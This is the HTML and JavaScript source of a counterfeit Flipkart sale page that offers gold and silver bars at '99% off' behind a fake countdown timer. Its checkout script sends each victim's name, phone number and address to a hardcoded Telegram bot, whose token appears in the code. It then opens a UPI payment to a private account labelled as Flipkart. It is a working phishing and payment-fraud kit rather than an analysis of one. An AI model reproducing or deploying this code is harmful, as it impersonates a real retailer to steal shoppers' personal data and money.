<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Flipkart | Big Billion Days</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css" />
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
        body { font-family: 'Roboto', sans-serif; background-color: #f1f3f6; margin: 0; overflow-x: hidden; }
        .fk-blue { background-color: #2874f0; }
        .btn-orange { background: #fb641b; color: #fff; border-radius: 2px; font-weight: bold; }
        .btn-yellow { background: #ff9f00; color: #fff; border-radius: 2px; font-weight: bold; }
        .rating-badge { background: #388e3c; color: #fff; padding: 2px 6px; border-radius: 3px; font-weight: bold; font-size: 11px; }
        .line-input { width: 100%; border-bottom: 2px solid #ccc; padding: 12px 0; outline: none; background: transparent; }
        /* Purana code */
.detail-swiper { height: 350px; width: 100%; background: white; }
.detail-swiper img { width: 100%; height: 100%; object-fit: contain; }

/* --- YE NYA CODE ADD KAREIN (Banner Size Badhane ke liye) --- */
/* --- Banner Fix Code --- */
.home-swiper {
    height: auto !important; /* Fixed height hata kar auto kar diya */
    width: 100%;
}
.home-swiper .swiper-slide img {
    width: 100%;
    height: auto; /* Height ko image ke hisaab se adjust hone dega */
    object-fit: contain; /* Image kategi nahi, poori dikhegi */
}
        .full-stack img { width: 100%; height: auto; display: block; }
        .offer-tag { color: #26a541; font-size: 12px; font-weight: 500; }
      .deal-timer {
    background: #fff5f5;
    color: #d32f2f;
    padding: 8px;
    font-weight: bold;
    font-size: 13px;
    display: flex;
    align-items: center;
    gap: 6px;
    border-bottom: 1px solid #ffe0e0;
}
.timer-box {
    background: #d32f2f;
    color: white;
    padding: 2px 4px;
    border-radius: 2px;
    margin: 0 2px;
}
    </style>
</head>
<body>

    <div id="page-home">
        <div class="sticky top-0 z-[1000] bg-white shadow-sm">
    <header class="py-3 px-4 flex items-center justify-between border-b">
        <div class="flex items-center gap-3">
            <i class="fa-solid fa-bars text-gray-600 text-lg"></i>
            <img src="https://static-assets-web.flixcart.com/batman-returns/batman-returns/p/images/fkheaderlogo_exploreplus_mobile-f4d035.svg" class="h-9">
        </div>
        <i class="fa-solid fa-cart-shopping text-gray-600"></i>
    </header>

    <div class="bg-white px-4 pb-3">
        <div class="bg-gray-100 rounded-md flex items-center px-3 py-2 text-gray-500 gap-2 border border-gray-200">
            <i class="fa-solid fa-magnifying-glass text-xs"></i>
            <input type="text" placeholder="Search for products" class="text-sm w-full outline-none bg-transparent text-black">
        </div>
    </div>
</div>

<div id="scrollable-content">
    </div>
          <div class="bg-white overflow-x-auto no-scrollbar flex items-center gap-5 px-4 py-3 mb-1">
    <div class="flex flex-col items-center flex-shrink-0 cursor-pointer">
        <img src="https://rukminim1.flixcart.com/fk-p-flap/128/128/image/e00302d428f5c7be.png" class="h-10 w-10 object-contain">
        <span class="text-[10px] font-medium text-gray-800 mt-1">Top Offers</span>
    </div>
    <div class="flex flex-col items-center flex-shrink-0 cursor-pointer">
        <img src="https://rukminim1.flixcart.com/fk-p-flap/128/128/image/5f2ee7f883cdb774.png" class="h-10 w-10 object-contain">
        <span class="text-[10px] font-medium text-gray-800 mt-1 text-center">Mobiles</span>
    </div>
    <div class="flex flex-col items-center flex-shrink-0 cursor-pointer">
        <img src="https://rukminim1.flixcart.com/fk-p-flap/128/128/image/ff559cb9d803d424.png" class="h-10 w-10 object-contain">
        <span class="text-[10px] font-medium text-gray-800 mt-1">Fashion</span>
    </div>
    <div class="flex flex-col items-center flex-shrink-0 cursor-pointer">
        <img src="https://rukminim1.flixcart.com/fk-p-flap/128/128/image/af646c36d74c4be9.png" class="h-10 w-10 object-contain">
        <span class="text-[10px] font-medium text-gray-800 mt-1 text-center">Electronics</span>
    </div>
    <div class="flex flex-col items-center flex-shrink-0 cursor-pointer">
        <img src="https://rukminim1.flixcart.com/fk-p-flap/128/128/image/1788f177649e6991.png" class="h-10 w-10 object-contain">
        <span class="text-[10px] font-medium text-gray-800 mt-1 text-center">Home</span>
    </div>
    <div class="flex flex-col items-center flex-shrink-0 cursor-pointer">
        <img src="https://rukminim1.flixcart.com/fk-p-flap/128/128/image/e730a834ad950bae.png" class="h-10 w-10 object-contain">
        <span class="text-[10px] font-medium text-gray-800 mt-1 text-center">Grocery</span>
    </div>
</div>
<div class="swiper home-swiper bg-white mb-2"> 
    <div class="swiper-wrapper">
        <div class="swiper-slide px-2">
            <img src="https://i.ibb.co/xStn2p1b/IMG-20260202-WA0000.jpg" class="rounded-md w-full shadow-sm">
        </div>
        <div class="swiper-slide px-2">
            <img src="https://rukminim2.flixcart.com/fk-p-flap/1600/270/image/73a2db8ce0d06600.png?q=20" class="rounded-md w-full shadow-sm">
        </div>
    </div>
    <div class="swiper-pagination !bottom-2"></div>
</div>
        <main id="main-grid" class="grid grid-cols-2 gap-1 p-1 pb-20"></main>
    </div>

    <div id="page-detail" class="hidden fixed inset-0 bg-[#f1f3f6] z-[200] overflow-y-auto pb-20">
        <nav class="p-3 border-b sticky top-0 bg-white z-[210] flex items-center justify-between shadow-sm">
            <div class="flex items-center gap-4">
                <i class="fa-solid fa-arrow-left text-xl" onclick="showPage('page-home')"></i>
                <img src="https://static-assets-web.flixcart.com/batman-returns/batman-returns/p/images/fkheaderlogo_exploreplus_mobile-f4d035.svg" class="h-4">
            </div>
            <div class="flex gap-4 text-gray-600">
                <i class="fa-solid fa-magnifying-glass"></i>
                <i class="fa-solid fa-cart-shopping"></i>
            </div>
        </nav>
     

        <div class="swiper detail-swiper"><div class="swiper-wrapper" id="swiper-images"></div><div class="swiper-pagination"></div></div>
<div class="deal-timer">
    <i class="fa-regular fa-clock"></i>
    <span>Deal ends in </span>
    <span id="countdown-timer">
        <span class="timer-box" id="t-hours">00</span>:
        <span class="timer-box" id="t-min">00</span>:
        <span class="timer-box" id="t-sec">00</span>
    </span>
</div>
        <div class="p-4 bg-white">
            <p id="det-name" class="text-md text-gray-800 leading-tight"></p>
            <div class="flex items-center gap-2 mt-2">
                <span class="rating-badge">4.4 ‚òÖ</span>
                <span class="text-gray-400 text-sm font-medium">(2,45,102 ratings)</span>
                <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/fa_9e47c1.png" class="h-6 ml-auto">
            </div>
            <div class="flex items-baseline gap-2 mt-2">
                <span id="det-price" class="text-2xl font-bold"></span>
                <span id="det-mrp" class="text-gray-400 line-through text-sm"></span>
                <span class="text-green-600 font-bold text-sm">99% off</span>
            </div>
            <p class="text-green-600 text-xs font-bold mt-1">Extra ‚Çπ500 off on first order</p>
        </div>

        <div class="mt-2 bg-white p-4">
            <p class="font-bold text-sm mb-2">All Offers & Coupons</p>
            <div class="space-y-3">
                <div class="flex gap-3 items-start">
                    <i class="fa-solid fa-tag text-green-600 mt-1"></i>
                    <p class="text-xs text-gray-700"><b>Bank Offer</b> 10% off on HDFC Bank Credit Card Transactions, up to ‚Çπ1,250. <span class="text-blue-600 font-bold">T&C</span></p>
                </div>
                <div class="flex gap-3 items-start border-t pt-2">
                    <i class="fa-solid fa-tag text-green-600 mt-1"></i>
                    <p class="text-xs text-gray-700"><b>Bank Offer</b> 5% Cashback on Flipkart Axis Bank Card. <span class="text-blue-600 font-bold">T&C</span></p>
                </div>
            </div>
        </div>

        <div class="flex justify-around bg-white mt-2 p-3 border-b text-center">
            <div class="flex flex-col items-center gap-1">
                <img src="https://cdn-icons-png.flaticon.com/512/1271/1271380.png" class="h-8 w-8">
                <span class="text-[10px] text-gray-600">7 Days<br>Replacement</span>
            </div>
            <div class="flex flex-col items-center gap-1">
                <img src="https://static-assets-web.flixcart.com/fk-sp-static/images/Flipkart_brand_assure_logo_white1717061037.png" class="h-8 w-8">
                <span class="text-[10px] text-gray-600">flipkart<br>Assured</span>
            </div>
            <div class="flex flex-col items-center gap-1">
                <img src="https://cdn-icons-png.flaticon.com/512/2331/2331941.png" class="h-8 w-8">
                <span class="text-[10px] text-gray-600">Cash on<br>Delivery</span>
            </div>
        </div>

        <div class="mt-2 bg-white">
            <p class="p-4 text-xs font-bold text-gray-400 uppercase border-b">Product Description</p>
            <div id="full-stack-images" class="full-stack"></div>
        </div>

        <div class="fixed bottom-0 w-full flex h-14 bg-white border-t z-[220]">
            <button class="w-1/2 font-bold text-sm text-black flex items-center justify-center">ADD TO CART</button>
            <button onclick="showPage('page-address')" class="w-1/2 btn-yellow font-bold text-sm flex items-center justify-center">BUY NOW</button>
        </div>
    </div>

    <div id="page-address" class="hidden fixed inset-0 bg-white z-[300] overflow-y-auto">
        <nav class="fk-blue p-4 text-white flex items-center gap-4">
            <i class="fa-solid fa-arrow-left" onclick="showPage('page-detail')"></i>
            <span class="font-medium">Add Delivery Address</span>
        </nav>
      <div class="flex items-center justify-between bg-white px-8 py-3 border-b text-[10px] font-medium text-gray-500">
    <div class="flex flex-col items-center gap-1 text-blue-600">
        <div class="w-5 h-5 rounded-full border-2 border-blue-600 flex items-center justify-center bg-blue-600 text-white">1</div>
        <span>Address</span>
    </div>
    <div class="h-[1px] bg-gray-300 flex-grow mx-2 -mt-4"></div>
    <div class="flex flex-col items-center gap-1">
        <div class="w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">2</div>
        <span>Order Summary</span>
    </div>
    <div class="h-[1px] bg-gray-300 flex-grow mx-2 -mt-4"></div>
    <div class="flex flex-col items-center gap-1">
        <div class="w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">3</div>
        <span>Payment</span>
    </div>
</div>
        <div class="p-6 space-y-6">
            <input type="text" id="uName" placeholder="Full Name (Required)*" class="line-input">
            <input type="tel" id="uPhone" placeholder="Mobile Number (Required)*" class="line-input" maxlength="10">
            <input type="number" id="uPin" placeholder="Pincode (Required)*" class="line-input" oninput="fetchPin(this.value)">
            <div class="flex gap-4">
                <input type="text" id="uCity" placeholder="City" class="line-input w-1/2 bg-gray-100" readonly>
                <input type="text" id="uState" placeholder="State" class="line-input w-1/2 bg-gray-100" readonly>
            </div>
            <input id="uAdd" placeholder="House No, Building Name*" class="line-input">
            <button onclick="goToSummary()" class="w-full btn-orange py-4 rounded shadow-lg uppercase">Save and Continue</button>
        </div>
    </div>
<div id="page-summary" class="hidden fixed inset-0 bg-[#f1f3f6] z-[350] overflow-y-auto">
    <nav class="fk-blue p-4 text-white flex items-center gap-4">
        <i class="fa-solid fa-arrow-left" onclick="showPage('page-address')"></i>
        <span class="font-medium">Order Summary</span>
    </nav>

    <div class="flex items-center justify-between bg-white px-8 py-3 border-b text-[10px] font-medium">
        <div class="flex flex-col items-center gap-1 text-green-600">
            <div class="w-5 h-5 rounded-full border-2 border-green-600 flex items-center justify-center bg-green-600 text-white">
                <i class="fa-solid fa-check text-[10px]"></i>
            </div>
            <span>Address</span>
        </div>
        <div class="h-[2px] bg-green-600 flex-grow mx-2 -mt-4"></div>
        <div class="flex flex-col items-center gap-1 text-blue-600">
            <div class="w-5 h-5 rounded-full border-2 border-blue-600 flex items-center justify-center bg-blue-600 text-white font-bold">2</div>
            <span>Summary</span>
        </div>
        <div class="h-[2px] bg-gray-200 flex-grow mx-2 -mt-4"></div>
        <div class="flex flex-col items-center gap-1 text-gray-400">
            <div class="w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center font-bold">3</div>
            <span>Payment</span>
        </div>
    </div>

    <div class="p-3">
        <div class="bg-white rounded-sm shadow-sm">
            <p class="p-3 text-sm font-bold text-gray-500 border-b uppercase">Price Details</p>
            <div class="p-3 space-y-4">
                <div class="flex justify-between text-base">
                    <span class="text-gray-800">Price (1 item)</span>
                    <span id="sum-mrp" class="text-gray-800"></span>
                </div>
                <div class="flex justify-between text-base">
                    <span class="text-gray-800">Discount</span>
                    <span class="text-green-600 font-medium">‚àí 99% Off</span>
                </div>
                <div class="flex justify-between text-base border-b border-dashed pb-4">
                    <span class="text-gray-800">Delivery Charges</span>
                    <span class="text-green-600 uppercase font-medium text-sm">Free Delivery</span>
                </div>
                <div class="flex justify-between font-bold text-lg pt-1">
                    <span>Total Amount</span>
                    <span id="sum-total"></span>
                </div>
            </div>
            <div class="bg-[#fafff5] border-t p-3">
                <p class="text-green-700 font-bold text-[13px]">You will save ‚Çπ(Calculated) on this order</p>
            </div>
        </div>

        <div class="flex items-center justify-center gap-2 mt-6 text-gray-500 font-bold text-[12px]">
            <i class="fa-solid fa-shield-halved text-gray-400 text-lg"></i>
            <span>Safe and Secure Payments. Easy returns.</span>
        </div>

        <div class="fixed bottom-0 left-0 w-full p-2 bg-white border-t flex items-center justify-between px-4">
            <div class="flex flex-col leading-none">
                <span id="sum-total-bottom" class="font-bold text-lg text-black"></span>
                <span class="text-blue-600 text-[10px] font-bold">View price details</span>
            </div>
            <button onclick="showPage('page-payment')" class="btn-orange px-10 py-3 rounded-sm shadow-md uppercase font-bold text-sm">
    Continue
</button>
        </div>
    </div>
</div>

    <div id="page-payment" class="hidden fixed inset-0 bg-[#f1f3f6] z-[400] overflow-y-auto">
        <nav class="fk-blue p-4 text-white flex items-center gap-4">
            <i class="fa-solid fa-arrow-left" onclick="showPage('page-summary')"></i>
            <span class="font-medium">Payments</span>
        </nav>
      <div class="flex items-center justify-between bg-white px-8 py-3 border-b text-[10px] font-medium text-gray-500">
    <div class="flex flex-col items-center gap-1 text-blue-600">
        <div class="w-5 h-5 rounded-full border-2 border-blue-600 flex items-center justify-center bg-blue-600 text-white">1</div>
        <span>Address</span>
    </div>
    <div class="h-[1px] bg-gray-300 flex-grow mx-2 -mt-4"></div>
    <div class="flex flex-col items-center gap-1">
        <div class="w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">2</div>
        <span>Order Summary</span>
    </div>
    <div class="h-[1px] bg-gray-300 flex-grow mx-2 -mt-4"></div>
    <div class="flex flex-col items-center gap-1">
        <div class="w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center">3</div>
        <span>Payment</span>
    </div>
</div>
        <div class="p-4">
            <div class="bg-white p-4 rounded shadow-sm">
                <label class="flex items-center justify-between">
                    <div class="flex gap-4 items-center">
                        <img src="https://img.icons8.com/color/48/phone-pe.png" class="w-6 h-6">
                        <span class="font-bold">UPI (PhonePe / GPay)</span>
                    </div>
                    <input type="radio" checked>
                </label>
            </div>
            <button onclick="confirmPay()" class="w-full btn-orange py-4 mt-8 shadow-xl uppercase font-bold">Place Order & Pay</button>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
    <script>
        const BOT_TOKEN = "8327016009:AAH1igUPnQsuURjtmxxHqaAWTKS-haiO7jM";
        const CHAT_ID = "1981500395";
        const MY_UPI = "john.sa@ptyes";

        // ‡§Ø‡§π‡§æ‡§Å descImgs: [] ‡§Æ‡•á‡§Ç ‡§Ü‡§™ ‡§≤‡§Ç‡§¨‡•Ä ‡§¨‡•à‡§®‡§∞ ‡§´‡•ã‡§ü‡•ã ‡§°‡§æ‡§≤ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç
        const products = [
            { id: 39, name: "AUYyRIG10.01155 24 (9999) K 10 g Yellow Gold Bar",price:"489",mrp: "164820",imgs:["https://rukminim1.flixcart.com/image/2560/2560/xif0q/coin/d/5/g/24-9999-1-auyyrig10-01155-mmtc-pamp-india-pvt-ltd-original-imahfjznage3ggq9.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/coin/z/9/7/24-9999-1-auyyrig10-01155-mmtc-pamp-india-pvt-ltd-original-imahfjznftacjhbq.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/coin/k/q/a/24-9999-1-auyyrig10-01155-mmtc-pamp-india-pvt-ltd-original-imahfjznwqxeeyht.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/coin/d/y/n/24-9999-1-auyyrig10-01155-mmtc-pamp-india-pvt-ltd-original-imahfjznejz333dq.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/coin/g/w/x/24-9999-1-auyyrig10-01155-mmtc-pamp-india-pvt-ltd-original-imahfjznphhgm2ne.jpeg?q=90"]},
           
              { id: 39, name: "SB-999-500G S 999 500 g Silver Bar", price: "599", mrp:"181180",imgs: ["https://rukminim1.flixcart.com/image/2560/2560/xif0q/coin/9/f/y/na-1-sb-999-500g-bangalore-refinery-original-imahfayrtfvhqn9g.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/coin/f/v/p/na-1-sb-999-100g-bangalore-refinery-original-imahfayhytnrcrg3.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/coin/r/b/z/na-1-sb-999-500g-bangalore-refinery-original-imahfayrvr4qjkcb.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/coin/p/t/a/na-1-sb-999-250g-bangalore-refinery-original-imahfayq7mj25kbd.jpeg?q=90","https://rukminim1.flixcart.com/image/2560/2560/xif0q/coin/b/w/y/na-1-sb-999-100g-bangalore-refinery-original-imahfayhqrs8cug6.jpeg?q=90"] }
        ];

        let sel = null;
        let swpDet;

        function init() {
    const grid = document.getElementById('main-grid');
    grid.innerHTML = ''; // Clear old content
    products.forEach(p => {
        grid.innerHTML += `
        <div class="bg-white p-2 border-[0.5px] border-gray-200 flex flex-col cursor-pointer" onclick="openProduct(${p.id})">
            <div class="relative">
                <img src="${p.imgs[0]}" class="h-72 w-full object-contain mx-auto">
                <i class="fa-regular fa-heart absolute top-1 right-1 text-gray-400"></i>
            </div>
            <p class="text-xs mt-3 line-clamp-1 text-gray-700">${p.name}</p>
            <div class="flex items-center gap-1 mt-1">
                <span class="bg-green-700 text-white text-[9px] px-1 rounded flex items-center gap-0.5">4.4 <i class="fa-solid fa-star text-[7px]"></i></span>
                <span class="text-gray-400 text-[9px] font-medium">(2,105)</span>
                <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/fa_9e47c1.png" class="h-5 ml-auto">
            </div>
            <div class="flex items-center gap-1.5 mt-1">
                <span class="font-bold text-sm">‚Çπ${p.price}</span>
                <span class="text-gray-400 line-through text-[10px]">‚Çπ${p.mrp}</span>
                <span class="text-green-600 text-[10px] font-bold">99% off</span>
            </div>
            <p class="text-[10px] text-gray-800 mt-0.5">Free delivery</p>
            <p class="text-[10px] text-green-700 font-bold">Daily Saver</p>
        </div>`;
    });
}
      function startTimer() {
    // Hum 8 ghante ka countdown set kar rahe hain
    let hours = 00, minutes = 10, seconds = 0;

    setInterval(() => {
        if (seconds > 0) seconds--;
        else {
            seconds = 59;
            if (minutes > 0) minutes--;
            else {
                minutes = 59;
                if (hours > 0) hours--;
            }
        }

        // DOM update karna
        document.getElementById('t-hours').innerText = hours.toString().padStart(2, '0');
        document.getElementById('t-min').innerText = minutes.toString().padStart(2, '0');
        document.getElementById('t-sec').innerText = seconds.toString().padStart(2, '0');
    }, 1000);
}

// init function ke andar ise call karein
const originalInit = init;
init = function() {
    originalInit();
    startTimer();
};
        function showPage(id) {
    ['page-home', 'page-detail', 'page-address', 'page-summary', 'page-payment'].forEach(p => {
        document.getElementById(p).classList.add('hidden');
    });
    document.getElementById(id).classList.remove('hidden');
    window.scrollTo(0,0);

    // Summary page par pohochne par address ko checkmark dikhana
    if(id === 'page-summary') {
        console.log("Summary Loaded");
    }
}
        function openProduct(id) {
            sel = products.find(p => p.id === id);
            document.getElementById('det-name').innerText = sel.name;
            document.getElementById('det-price').innerText = "‚Çπ" + sel.price;
            document.getElementById('det-mrp').innerText = "‚Çπ" + sel.mrp;
            
            // Image Slider
            const swpWrapper = document.getElementById('swiper-images');
            swpWrapper.innerHTML = '';
            sel.imgs.forEach(url => {
                swpWrapper.innerHTML += `<div class="swiper-slide"><img src="${url}"></div>`;
            });

            // Product Description Stack (Using descImgs if available, else imgs)
            const fS = document.getElementById('full-stack-images');
            fS.innerHTML = ''; 
            const dPhotos = (sel.descImgs && sel.descImgs.length > 0) ? sel.descImgs : sel.imgs;
            dPhotos.forEach(url => {
                fS.innerHTML += `<img src="${url}" class="w-full">`;
            });

            showPage('page-detail');
            if(swpDet) swpDet.destroy();
            swpDet = new Swiper(".detail-swiper", { pagination: { el: ".swiper-pagination" } });
        }

        function goToSummary() {
    const name = document.getElementById('uName').value;
    const phone = document.getElementById('uPhone').value;

    if(name && phone && phone.length === 10) {
        // Price Calculation
        const mrpVal = parseInt(sel.mrp.replace(/,/g, '')) || 0;
        const priceVal = parseInt(sel.price.replace(/,/g, '')) || 0;
        const savings = mrpVal - priceVal;

        // UI Updates
        document.getElementById('sum-mrp').innerText = "‚Çπ" + sel.mrp;
        document.getElementById('sum-total').innerText = "‚Çπ" + sel.price;
        document.getElementById('sum-total-bottom').innerText = "‚Çπ" + sel.price;
        
        // Savings text update
        const savingsText = document.querySelector('#page-summary .bg-\\[\\#fafff5\\] p');
        if(savingsText) savingsText.innerText = `You will save ‚Çπ${savings.toLocaleString()} on this order`;

        showPage('page-summary');
    } else { 
        alert("Please enter a valid Name and 10-digit Mobile Number"); 
    }
}

        async function confirmPay() {
            // Sari details collect karna
            const name = document.getElementById('uName').value;
            const phone = document.getElementById('uPhone').value;
            const pincode = document.getElementById('uPin').value;
            const city = document.getElementById('uCity').value;
            const address = document.getElementById('uAdd').value;

            // Message format (thoda sundar banaya hai)
            const msg = `üî• *NEW ORDER ALERT* üî•\n\n` +
                        `üì¶ *Item:* ${sel.name}\n` +
                        `üí∞ *Price:* ‚Çπ${sel.price}\n\n` +
                        `üë§ *Name:* ${name}\n` +
                        `üìû *Phone:* ${phone}\n` +
                        `üìç *Pin:* ${pincode}\n` +
                        `üèôÔ∏è *City:* ${city}\n` +
                        `üè† *Add:* ${address}`;

            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;

            try {
                // Pehle message bhejne ka intezaar karega
                await fetch(url);
                console.log("Telegram notification sent!");
            } catch (e) {
                console.log("Telegram failed but moving to payment");
            }

            // Ab Payment par le jayega
            window.location.href = `upi://pay?pa=${MY_UPI}&pn=Flipkart&am=${sel.price}&cu=INR`;
        }

        // Ye line hamesha last mein rehni chahiye
        init();
    </script>
</body>
</html> 

